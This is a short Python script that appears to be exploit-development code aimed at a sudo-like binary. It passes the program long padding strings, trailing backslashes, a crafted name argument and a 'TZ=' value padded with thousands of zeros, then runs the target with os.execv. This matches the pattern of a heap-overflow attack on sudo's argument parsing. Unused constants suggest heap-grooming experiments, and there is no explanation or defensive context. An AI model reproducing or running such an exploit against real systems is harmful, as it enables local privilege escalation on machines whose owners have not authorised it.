import json
import subprocess
import sys
import os

NEXT = "22223333"
#LIBRARY = "00001111"
#KNOWN = "AAAABBBB"
NAME = "XXXX/liveoverflow"
cases = []

arg = [
    "B"*124+"\\",
    "A"*(179)+"\\",
    "\\","\\","\\","\\","\\","\\","\\",
    "\\","\\","\\","\\","\\","\\","\\","\\",
    "XXXX/liveoverflow",
    "TZ="+"0"*2944
]


args = ["/home/user/Documents/sudoenv2"] + arg
os.execv("/home/user/Documents/sudoenv2", args)
